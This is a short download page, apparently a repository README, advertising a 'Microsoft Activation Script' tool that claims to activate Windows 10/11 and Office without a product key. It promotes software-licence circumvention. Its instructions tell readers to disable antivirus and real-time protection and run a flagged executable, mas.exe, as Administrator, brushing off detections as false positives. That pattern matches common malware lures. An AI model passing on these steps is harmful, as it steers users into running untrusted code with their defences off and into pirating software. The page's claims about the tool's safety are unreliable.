Microsoft Activation Script (MAS) - Free Windows 10 & Windows 11 Activator

Overview

Microsoft Activation Script (MAS) is the most popular free open-source tool to permanently activate Windows 10, Windows 11, and Microsoft Office. Supports HWID, KMS, KMS38, and Ohook methods.

Key Features

  • Permanent Windows 10 / Windows 11 activation
  • Full support for all editions (Home, Pro, Enterprise, Education)
  • Microsoft Office 365, 2021, 2024 activation
  • HWID Activation, KMS Activation, Ohook
  • Works offline after initial setup
  • No product key required

How to Activate Windows 11 / Windows 10

  1. Download the latest MAS.zip from Releases
  2. Extract the archive
  3. Temporarily disable antivirus (Windows Defender often flags mas.exe as false positive)
  4. Run mas.exe as Administrator
  5. Choose activation method and follow instructions
⚠️ Antivirus Warning: Many antiviruses detect mas.exe as a threat and delete it. Disable real-time protection before running, then re-enable it after activation.

Supported Activation Methods

  • HWID Activation — Best for permanent digital license
  • KMS Activation — Ideal for Windows 11
  • Ohook Activation — For Microsoft Office 365 / 2021 / 2024
